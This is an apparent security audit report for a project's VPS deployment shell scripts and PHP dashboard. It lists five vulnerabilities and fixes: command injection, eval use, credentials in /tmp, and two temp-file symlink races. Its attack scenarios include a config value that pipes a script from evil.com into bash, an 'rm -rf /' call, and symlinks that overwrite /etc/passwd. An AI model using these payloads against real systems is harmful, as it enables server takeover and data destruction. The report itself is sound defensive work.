# Critical Security Findings - Immediate Action Required

**Status:** ⚠️ DO NOT USE IN PRODUCTION UNTIL FIXED
**Date:** 2025-12-29
**Risk Level:** CRITICAL

## Executive Summary

The deployment scripts contain **5 critical security vulnerabilities** that allow:
- Remote code execution on VPS servers
- Local code execution on control machine
- Credential theft
- Privilege escalation

**Estimated fix time:** 8-16 hours for critical issues only

---

## Critical Issue #1: Remote Command Injection

**Location:** `/home/calounx/repositories/mentat/chom/deploy/deploy-enhanced.sh:934-947, 1917`

**Severity:** CRITICAL (CVSS 9.8)

### The Vulnerability

```bash
# Line 934-947: remote_exec function
remote_exec() {
    local host=$1
    local user=$2
    local port=$3
    local cmd=$4

    ssh ... "${user}@${host}" "$cmd"  # $cmd is NOT sanitized
}

# Line 1917: obs_ip from config is injected directly
remote_exec "$ip" "$user" "$port" "chmod +x /tmp/setup.sh && OBSERVABILITY_IP=${obs_ip} /tmp/setup.sh"
```

### Attack Scenario

1. Attacker modifies `configs/inventory.yaml`:
```yaml
observability:
  ip: "1.2.3.4; curl http://evil.com/backdoor.sh | bash; echo"
```

2. When deployment runs, the executed command becomes:
```bash
OBSERVABILITY_IP=1.2.3.4; curl http://evil.com/backdoor.sh | bash; echo /tmp/setup.sh
```

3. **Result:** Attacker's backdoor runs on VPS with root privileges

### Impact
- Complete compromise of VPS servers
- Data theft
- Cryptocurrency mining
- Ransomware deployment

### Quick Fix

```bash
# In remote_exec function, validate inputs:
remote_exec() {
    local host=$1
    local user=$2
    local port=$3
    local cmd=$4

    # Validate host is valid IP
    if ! [[ "$host" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        log_error "Invalid host: $host"
        return 1
    fi

    # Validate user is alphanumeric
    if ! [[ "$user" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        log_error "Invalid user: $user"
        return 1
    fi

    # Validate port is numeric
    if ! [[ "$port" =~ ^[0-9]+$ ]]; then
        log_error "Invalid port: $port"
        return 1
    fi

    # Execute with -- to prevent command injection
    ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -i "$key_path" \
        -p "$port" \
        "${user}@${host}" \
        -- \
        "$cmd"
}

# Before line 1917, validate obs_ip:
if ! [[ "$obs_ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    log_error "Invalid observability IP: $obs_ip"
    exit 1
fi
```

---

## Critical Issue #2: Local Code Execution via eval

**Location:** `/home/calounx/repositories/mentat/chom/deploy/deploy-enhanced.sh:1001, 1019`

**Severity:** CRITICAL (CVSS 9.1)

### The Vulnerability

```bash
retry_with_healing() {
    local command_to_retry=$2
    local auto_fix_function=${3:-""}

    if eval "$command_to_retry"; then  # DANGEROUS!
        ...
    fi

    if eval "$auto_fix_function"; then  # DANGEROUS!
        ...
    fi
}
```

### Attack Scenario

If any caller of `retry_with_healing` passes user-controlled data, it executes directly:

```bash
# Hypothetical malicious call:
retry_with_healing "test" "rm -rf /; echo hacked" "echo fixed"
```

### Impact
- Code execution on deployment machine
- Destruction of local files
- Credential theft from ~/.ssh, ~/.aws, etc.

### Quick Fix

```bash
# Replace eval with direct function calls
retry_with_healing() {
    local operation_name=$1
    shift
    local attempt=1
    local max_attempts=$MAX_RETRIES

    while [[ $attempt -le $max_attempts ]]; do
        # Execute function directly, not via eval
        if "$@"; then
            return 0
        fi

        local exit_code=$?

        if [[ $attempt -eq $max_attempts ]]; then
            log_error "$operation_name failed after $max_attempts attempts"
            return $exit_code
        fi

        local delay=$(calculate_backoff $attempt)
        log_info "Retrying in $delay seconds..."
        sleep $delay
        ((attempt++))
    done
}

# Usage (no eval needed):
retry_with_healing "SSH test" test_ssh_connection "$host" "$user" "$port"
```

---

## Critical Issue #3: Credential Exposure in /tmp

**Location:** `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-vpsmanager-vps.sh:228-244`

**Severity:** CRITICAL (CVSS 8.4)

### The Vulnerability

```bash
# Line 228: Created with default perms (644 = world-readable!)
cat > /tmp/.my.cnf << EOF
[client]
user=root
password=${MYSQL_ROOT_PASSWORD}
EOF
chmod 600 /tmp/.my.cnf  # TOO LATE - already readable

# Other users saw the password between lines 228 and 233
```

### Attack Timeline

```
00:00.000  cat creates /tmp/.my.cnf with perms 644 (rw-r--r--)
00:00.001  Password written to file
00:00.050  Attacker reads: cat /tmp/.my.cnf
00:00.100  chmod 600 runs (now secure, but too late)
```

### Impact
- Database root password leaked
- Attacker can:
  - Read all databases
  - Modify data
  - Create backdoor accounts
  - Escalate to system root

### Quick Fix

```bash
# Use mktemp with proper permissions
MYSQL_CONF=$(mktemp /root/.my.cnf.XXXXXX)
chmod 600 "$MYSQL_CONF"  # Set BEFORE writing

cat > "$MYSQL_CONF" << EOF
[client]
user=root
password=${MYSQL_ROOT_PASSWORD}
EOF

mysql --defaults-extra-file="$MYSQL_CONF" << 'SQL'
...
SQL

# Secure deletion
shred -u "$MYSQL_CONF" 2>/dev/null || rm -f "$MYSQL_CONF"
```

---

## Critical Issue #4: Predictable Temp Files (Race Condition)

**Location:** `/home/calounx/repositories/mentat/chom/deploy/deploy-enhanced.sh:462-510`

**Severity:** HIGH (CVSS 7.8)

### The Vulnerability

```bash
update_state() {
    local tmp_file="${STATE_FILE}.tmp.$$"  # Predictable: .tmp.12345

    # WRONG: Double quotes expand NOW
    trap "rm -f '$tmp_file'" RETURN  # If $tmp_file=''; expands to "rm -f ''"

    jq "..." > "$tmp_file"  # Race condition window
    mv "$tmp_file" "$STATE_FILE"
}
```

### Attack Scenario

1. Attacker predicts PID will be 12345
2. Creates symlink: `ln -s /etc/passwd /path/.deploy-state/deployment.state.tmp.12345`
3. Script runs, writes to symlink
4. **Result:** /etc/passwd overwritten with JSON

### Impact
- File system corruption
- Privilege escalation
- System unusable

### Quick Fix

```bash
update_state() {
    local tmp_file
    tmp_file=$(mktemp "${STATE_FILE}.XXXXXX")  # Random, secure
    chmod 600 "$tmp_file"  # Secure permissions

    # CORRECT: Single quotes prevent immediate expansion
    trap 'rm -f "$tmp_file"' RETURN

    if ! jq ".status = \"$status\"" "$STATE_FILE" > "$tmp_file" 2>/dev/null; then
        log_error "Failed to update state"
        return 1
    fi

    if ! mv "$tmp_file" "$STATE_FILE"; then
        log_error "Failed to save state"
        return 1
    fi
}
```

---

## Critical Issue #5: Dashboard PHP Temp File Vulnerability

**Location:** `/home/calounx/repositories/mentat/chom/deploy/scripts/setup-vpsmanager-vps.sh:402-436`

**Severity:** HIGH (CVSS 7.5)

### The Vulnerability

```php
// Line 402: Attacker knows their own IP!
$attempts_file = '/tmp/dashboard_login_attempts_' . md5($_SERVER['REMOTE_ADDR']);

function record_failed_attempt($attempts_file) {
    $attempts = ...;
    file_put_contents($attempts_file, json_encode($attempts));  // Default perms!
    chmod($attempts_file, 0600);  // TOO LATE
}
```

### Attack Scenario

1. Attacker calculates MD5 of their IP:
```bash
echo -n "1.2.3.4" | md5sum
# Output: abc123def456...
```

2. Creates malicious symlink:
```bash
ln -s /etc/passwd /tmp/dashboard_login_attempts_abc123def456...
```

3. Visits dashboard, enters wrong password
4. PHP writes to symlink
5. **Result:** /etc/passwd corrupted

### Impact
- System files overwritten
- Web shell upload
- Privilege escalation

### Quick Fix

```php
// Replace temp files with session storage
session_start();

function check_rate_limit($max_attempts, $lockout_duration) {
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = [];
    }

    // Clean old attempts
    $_SESSION['login_attempts'] = array_filter(
        $_SESSION['login_attempts'],
        function($time) use ($lockout_duration) {
            return (time() - $time) < $lockout_duration;
        }
    );

    return count($_SESSION['login_attempts']) < $max_attempts;
}

function record_failed_attempt() {
    if (!isset($_SESSION['login_attempts'])) {
        $_SESSION['login_attempts'] = [];
    }
    $_SESSION['login_attempts'][] = time();
}

function clear_attempts() {
    $_SESSION['login_attempts'] = [];
}
```

---

## Immediate Action Plan

### Step 1: Stop Using in Production (5 minutes)
- Do not run these scripts on production systems
- If already deployed, audit affected systems for compromise

### Step 2: Apply Critical Patches (4-8 hours)
1. Fix remote_exec injection (1 hour)
2. Remove eval usage (2 hours)
3. Fix credential temp files (1 hour)
4. Fix state file temp files (2 hours)
5. Fix dashboard temp files (2 hours)

### Step 3: Test Patches (2-4 hours)
- Test with malicious configs
- Verify no credentials in /tmp
- Check file permissions
- Run concurrent deployments

### Step 4: Security Audit (2 hours)
- Run shellcheck
- Review all user inputs
- Check all temp file usage
- Verify all remote commands

### Step 5: Deploy Safely (1 hour)
- Update documentation
- Tag secure version
- Notify users of security fixes

---

## Verification Tests

### Test 1: Command Injection
```bash
# Edit inventory.yaml
observability:
  ip: "1.2.3.4; touch /tmp/HACKED; echo"

# Run deployment
./deploy-enhanced.sh --validate

# Check if attack worked
ssh vps "ls /tmp/HACKED"
# Should NOT exist if patched
```

### Test 2: Credential Leak
```bash
# On VPS during deployment, run:
watch -n 0.1 'ls -la /tmp/.my.cnf 2>/dev/null'

# Should NEVER show file with 644 permissions
```

### Test 3: Temp File Race
```bash
# Predict PID and create malicious symlink
ln -s /etc/motd .deploy-state/deployment.state.tmp.99999

# If vulnerable, /etc/motd gets overwritten
```

---

## Post-Fix Verification

After applying fixes, verify:

```bash
# 1. No eval usage
grep -n "eval " deploy-enhanced.sh
# Should show zero results

# 2. No /tmp credentials
grep -n "/tmp/.*password" scripts/*.sh
# Should show zero results

# 3. All mktemp usage secure
grep -n "mktemp" *.sh scripts/*.sh
# All should have chmod 600 immediately after

# 4. All remote_exec calls validated
grep -n "remote_exec.*\$(get_config" deploy-enhanced.sh
# Should have validation before each call

# 5. Shellcheck passes
shellcheck deploy-enhanced.sh scripts/*.sh
# Should show zero errors
```

---

## Contact

If you discover additional security issues:
1. Do NOT open public GitHub issues
2. Email security contact (if available)
3. Use responsible disclosure

---

## Legal Notice

These vulnerabilities are disclosed for defensive purposes only. Exploiting these vulnerabilities without authorization is illegal.
